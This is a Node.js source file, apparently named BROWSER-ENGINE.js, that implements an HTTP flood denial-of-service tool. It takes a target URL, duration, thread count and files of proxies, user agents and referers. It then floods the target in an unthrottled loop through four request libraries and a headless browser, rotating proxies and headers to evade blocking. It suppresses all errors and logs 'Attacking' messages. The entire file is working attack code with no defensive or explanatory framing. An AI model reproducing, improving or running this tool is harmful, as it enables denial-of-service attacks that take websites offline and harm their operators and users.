const url = require("url");
const chalk = require("chalk");
const EventEmitter = require('events');
const fs = require('fs');
const Browser = require('zombie');
const superagent = require('superagent');
require('superagent-proxy')(superagent)
const axios = require('axios');
const request = require('request');
const HttpProxyAgent = require('http-proxy-agent');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
process.setMaxListeners(0);
EventEmitter.defaultMaxListeners = Infinity;
EventEmitter.prototype._maxListeners = Infinity;

process.on('uncaughtException', function (err) { }); //hataları yok et
process.on('unhandledRejection', function (err) { }); //hataları yok et

if(process.argv.length != 9)
{
    console.log(chalk.red(`Wrong Usage!`));
    console.log(chalk.yellow(`Usage: node BROWSER-ENGINE.js [URL] [TIME] [UA-FILE] [THREADS] [METHOD] [PROXY-FILE] [REFERER-FILE]`));
    process.exit(3162);
}

var target = process.argv[2];
var time = process.argv[3];
var useragentFile = process.argv[4];
var threads = process.argv[5];
var method = process.argv[6];
var proxiesFile = process.argv[7];
var refererFile = process.argv[8];
var targetPathname = url.parse(target).path;

const proxies = fs.readFileSync(proxiesFile, 'utf-8').match(/\S+/g);
const userAgents = fs.readFileSync(useragentFile, 'utf-8').replace(/\r/g, '').split('\n');
const referers = fs.readFileSync(refererFile, 'utf-8',).replace(/\r/g, '').split('\n');

console.log(chalk.green(`Attack started on ${target} for ${time} seconds!`));
var browser = new Browser();

function BrowserEngine()
{
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    var userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    var referer = referers[Math.floor(Math.random() * referers.length)];
    var proxyAgent = new HttpProxyAgent("http://" + proxy);

    console.log(chalk.green(`Attacking --> ${target} with ${proxy}`));

    SuperAgentRequest(target, proxy, userAgent, referer);
    BrowserRequest(target, proxy, userAgent, referer);
    AxiosRequest(target, method, userAgent, proxyAgent, referer);
    NormalRequest(target, method, proxy, userAgent, referer);
}

setInterval(() => {
    for(var i = 0; i < threads; i++)
    {
        BrowserEngine();
    }
});

setTimeout(() => process.exit(0), time * 1000);
process.on('uncaughtException', function (err) { });
process.on('unhandledRejection', function (err) { });

function SuperAgentRequest(targetString, proxyString, uaString, refererString)
{
    superagent
        .get(targetString)
        .proxy("http://" + proxyString)
        .timeout(3600*1000)
        .set('User-Agent', uaString)
        .set("Referer", refererString)
        .set('Cache-Control', 'no-store')
        .set('Connection', 'Keep-Alive')
        .end((err, res) => {
        if(err) {
            //console.error(err);
            return;
        }
    });
}

function BrowserRequest(targetString, proxyString, uaString, refererString)
{
    browser.referer = refererString;
    browser.proxy = "http://" + proxyString;
    browser.userAgent = uaString;
    browser.visit(targetString, function() {
        browser.reload();
        browser.reload();
        browser.reload();
    });
}

function AxiosRequest(targetString, methodString, uaString, proxyAgentString, refererString)
{
    const config = {
        method: methodString,
        url: targetString,
        headers: { 
            'User-Agent': uaString,
            'Referer': refererString,
            'Cache-Control': 'no-store',
            'Connection': 'Keep-Alive'
        },
        proxy: {
            host: proxyString.split(":")[0],
            port: proxyString.split(":")[1]
        }
    }
    axios(config);
}

function NormalRequest(targetString, methodString, proxyString, uaString, refererString)
{
    request({ 
        url: targetString,
        method: methodString,
        proxy: 'http://' + proxyString,
        headers: {
            'User-Agent': uaString,
            'Referer': refererString,
            'Cache-Control': 'no-store',
            'Connection': 'Keep-Alive'
        }
    });
}